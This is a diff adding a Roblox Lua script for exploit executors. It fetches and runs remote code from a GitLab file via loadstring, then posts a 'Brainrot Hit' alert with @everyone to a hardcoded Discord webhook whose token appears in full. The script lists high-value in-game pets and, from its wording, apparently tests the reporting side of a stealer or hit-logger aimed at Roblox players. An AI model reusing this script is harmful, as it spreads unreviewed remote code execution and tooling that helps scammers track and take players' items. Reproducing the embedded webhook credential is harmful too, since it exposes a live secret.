@@ -1,0 +1,59 @@
+-- Services
+local HttpService = game:GetService("HttpService")
+
+-- Load emoji table from GitLab
+local success, emojiTable = pcall(function()
+    return loadstring(game:HttpGet("https://gitlab.com/nolag-idp-group/emojisforstlr/-/raw/main/stlr"))()
+end)
+
+if not success then
+    warn("Failed to load emoji table!")
+end
+
+-- Replace this with your webhook from config
+local WEBHOOK = "https://discord.com/api/webhooks/1440740185871483043/KxPIkjhCn4ZGTP1dnB1CJFuOUBuZIj9OUp3nWG5KZnNugAHzHeLm-QgwqVE_1n5M2xdZ"
+
+-- Example brainrots
+local testPets = {
+    {name="Dragon Cannelloni", value="20M/s", floor="2nd Floor", num=2e7},
+    {name="Unknown Brainrot", value="1M/s", floor="1st Floor", num=1e6}
+}
+
+-- Build message
+local lines = {}
+for _, pet in ipairs(testPets) do
+    local emoji = (emojiTable and emojiTable[pet.name]) or "🧠
+"
+    table.insert(lines, string.format("%s %s → %s → %s", emoji, pet.name, pet.value, pet.floor))
+end
+
+-- Send to webhook
+local payload = {
+    content = "@everyone Test 🧠
+",
+    embeds = {{
+        title = "Test Brainrot Hit",
+        color = 123456,
+        fields = {
+            {name="Brainrots", value = table.concat(lines, "\n")}
+        }
+    }},
+    allowed_mentions = {parse={"everyone"}}
+}
+
+local req = (syn and syn.request) or http_request or (http and http.request) or request
+if req and WEBHOOK and WEBHOOK ~= "" then
+    local ok, err = pcall(function()
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"]="application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    if ok then
+        print("Webhook test sent successfully!")
+    else
+        warn("Webhook test failed:", err)
+    end
+end
